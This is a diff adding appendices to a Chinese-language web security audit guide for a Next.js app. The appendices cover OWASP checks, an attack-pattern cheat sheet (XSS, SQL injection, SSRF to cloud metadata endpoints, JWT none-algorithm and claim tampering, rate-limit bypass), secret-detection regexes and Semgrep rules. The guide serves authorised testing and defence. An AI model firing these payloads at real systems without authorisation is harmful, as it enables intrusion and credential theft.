@@ -189,7 +189,202 @@ npx audit-ci --high                    # CI 门禁（high+）
 | 配置检查 | next.config.ts, middleware.ts, .gitignore 文件审查 |
 | 安全头检查 | `curl -sI URL \| grep -iE "(strict-transport\|content-security\|x-frame\|x-content-type)"` |
 
-## 参考文档
+---
 
-- `references/owasp-top10-checklist.md` — OWASP Top 10 详细测试程序和 CVSS 评分指导
-- `references/attack-patterns.md` — XSS/SQLi/SSRF/JWT/IDOR 测试 payload 和检测模式
+# 附录 A：OWASP Top 10 详细检查（Next.js/TypeScript 适配）
+
+## A01: Broken Access Control — 详细
+
+**CWEs:** CWE-200, CWE-201, CWE-352, CWE-639, CWE-862, CWE-863
+
+| # | 检查项 | 方法 | 期望结果 |
+|---|---|---|---|
+| 1 | middleware.ts 路由保护 | 检查 matcher 配置 | /dashboard, /upload, /candidates/*, /api/* 被保护 |
+| 2 | API 路由 session 检查 | 每个 route.ts 调用 auth() | 未登录返回 401 |
+| 3 | IDOR 测试 | 修改 /api/candidates/[id] | 无越权访问 |
+| 4 | n8n callback 认证 | POST 无 secret | 返回 401 |
+| 5 | Mass Assignment | 添加特权字段 | 服务端忽略 |
+
+```typescript
+// ❌ BAD: API route without auth
+export async function GET() {
+  const candidates = await prisma.candidate.findMany();
+  return NextResponse.json(candidates);
+}
+
+// ✅ GOOD: Auth check
+export async function GET() {
+  const session = await auth();
+  if (!session) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
+  return NextResponse.json(await prisma.candidate.findMany());
+}
+```
+
+**CVSS:** 未认证 admin: 9.8 | 水平提升(读): 6.5 | 垂直到 admin: 8.8
+
+## A02: Cryptographic Failures — 详细
+
+| # | 检查项 | 期望结果 |
+|---|---|---|
+| 1 | 密码哈希 | bcrypt (cost ≥ 10) 或 argon2id |
+| 2 | 密钥比较 | `crypto.timingSafeEqual()` |
+| 3 | Token 生成 | `uuid.v4()` 或 `crypto.randomUUID()` |
+| 4 | 硬编码密钥 | 无 |
+| 5 | .env 保护 | .gitignore 中 |
+
+**CVSS:** 明文密码: 7.5 | 弱哈希(MD5): 7.5 | 硬编码密钥: 7.2
+
+## A03: Injection — 详细
+
+```typescript
+// ❌ BAD: SQL injection
+prisma.$queryRawUnsafe(`SELECT * WHERE name = '${name}'`)
+// ✅ GOOD: Prisma ORM
+prisma.candidate.findMany({ where: { name: { contains: name } } })
+
+// ❌ BAD: XSS
+<div dangerouslySetInnerHTML={{ __html: userContent }} />
+// ✅ GOOD: React auto-escapes
+<p>{userContent}</p>
+```
+
+**CVSS:** SQLi(未认证): 9.8 | Stored XSS: 7.1 | 命令注入: 9.8
+
+## A07: Authentication — 详细
+
+| # | 检查项 | 期望结果 |
+|---|---|---|
+| 1 | Credentials 验证 | bcrypt.compare |
+| 2 | Session 策略 | JWT |
+| 3 | Session 包含 user ID | token.id 存在 |
+| 4 | Logout | session 清除 |
+| 5 | JWT 算法 | RS256/HS256（非 none）|
+
+**CVSS:** 认证绕过: 9.8 | Session 固定: 7.5 | 用户名枚举: 5.3
+
+---
+
+# 附录 B：Attack Patterns 速查
+
+## XSS Payload
+
+```
+<script>alert(document.domain)</script>
+"><script>alert(document.domain)</script>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+<ScRiPt>alert(document.domain)</ScRiPt>
+<svg/onload=alert(document.domain)>
+javascript:alert(document.domain)//
+```
+
+**DOM XSS Sources:** document.location/.hash/.search, localStorage, postMessage
+**DOM XSS Sinks:** innerHTML, document.write(), eval(), setTimeout(string)
+
+## SQL Injection Payload
+
+```
+' OR '1'='1              -- Boolean true
+' AND 1=1--              -- Boolean true + comment
+' AND 1=2--              -- Boolean false（对比响应）
+```
+
+**SQLite 特定:** `' AND (SELECT CASE WHEN (1=1) THEN RANDOMBLOB(500000000) ELSE 1 END)--`
+
+## SSRF Payload
+
+```
+http://127.0.0.1 | http://localhost | http://[::1]
+http://169.254.169.254/latest/meta-data/     # AWS metadata
+http://metadata.google.internal/             # GCP metadata
+http://0x7f000001                            # Hex 127.0.0.1
+http://2130706433                            # Decimal 127.0.0.1
+```
+
+## JWT 攻击
+
+```json
+// None algorithm 攻击
+{"alg": "none", "typ": "JWT"}  // header.payload.（空签名）
+
+// Claim 操纵
+{"sub": "other-user", "role": "admin", "is_admin": true, "exp": 9999999999}
+
+// 弱密钥: secret, password, 123456, changeme
+```
+
+## IDOR/BOLA 测试
+
+```
+GET /api/candidates/{other-user-id}    → 期望 403
+PUT /api/candidates/{other-user-id}    → 期望 403
+DELETE /api/candidates/{other-user-id} → 期望 403
+```
+
+## Mass Assignment 测试
+
+```json
+POST /api/upload
+{ "name": "Test", "status": "completed", "overallScore": 100, "role": "admin" }
+// 检查额外字段是否被持久化
+```
+
+## Rate Limiting 绕过
+
+```
+X-Forwarded-For: 1.2.3.4
+X-Real-IP: 1.2.3.4
+/API/LOGIN                           # 大小写
+/api/./auth/callback                  # 路径变化
+```
+
+---
+
+# 附录 C：密钥检测正则
+
+```
+AWS Access Key:     AKIA[0-9A-Z]{16}
+GitHub Token:       ghp_[A-Za-z0-9]{36}
+Private Key:        -----BEGIN (RSA |EC )?PRIVATE KEY-----
+Generic Secret:     (?i)(password|secret|api_key)\s*=\s*["']?\S{8,}
+JWT Token:          eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+
+NextAuth Secret:    NEXTAUTH_SECRET\s*=\s*["']
+```
+
+---
+
+# 附录 D：安全头推荐
+
+| Header | 推荐值 |
+|---|---|
+| Content-Security-Policy | `default-src 'self'; script-src 'self'` |
+| X-Frame-Options | `DENY` |
+| X-Content-Type-Options | `nosniff` |
+| Strict-Transport-Security | `max-age=31536000; includeSubDomains` |
+| Referrer-Policy | `strict-origin-when-cross-origin` |
+| Permissions-Policy | `geolocation=(), microphone=(), camera=()` |
+
+---
+
+# 附录 E：Semgrep 自定义规则
+
+```yaml
+rules:
+  - id: hardcoded-secret
+    pattern: const $SECRET = "..."
+    message: "Hardcoded secret detected"
+    severity: ERROR
+    languages: [typescript]
+
+  - id: unsafe-raw-query
+    pattern: prisma.$queryRawUnsafe(...)
+    message: "Raw SQL query without parameterization"
+    severity: WARNING
+    languages: [typescript]
+
+  - id: eval-usage
+    pattern: eval(...)
+    message: "eval() usage — potential code injection"
+    severity: ERROR
+    languages: [typescript, javascript]
+```
